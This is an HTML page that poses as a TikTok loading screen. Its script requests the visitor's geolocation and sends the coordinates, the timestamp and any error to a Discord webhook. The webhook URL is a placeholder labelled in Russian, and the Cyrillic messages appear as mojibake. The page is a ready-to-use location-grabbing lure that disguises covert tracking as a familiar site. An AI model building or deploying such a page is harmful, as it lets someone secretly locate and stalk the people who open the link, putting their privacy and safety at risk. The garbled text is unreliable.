<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>TikTok</title>
</head>
<body>
  <h1>Loading TikTok...</h1>
  <script>
    const webhookURL = 'https://discord.com/api/webhooks/–í–ê–®_WEBHOOK_–¢–£–¢';

    function sendToDiscord(content) {
      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ content })
      });
    }

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const message = `üåç –ù–æ–≤–æ–µ –ø–æ—Å–µ—â–µ–Ω–∏–µ!\n–ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: ${lat}, ${lon}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
          sendToDiscord(message);
        }, error => {
          sendToDiscord(`‚õî –û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${error.message}`);
        });
      } else {
        sendToDiscord('‚ö†Ô∏è –ë—Ä–∞—É–∑–µ—Ä –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é');
      }
    }

    getLocation();
  </script>
</body>
</html>
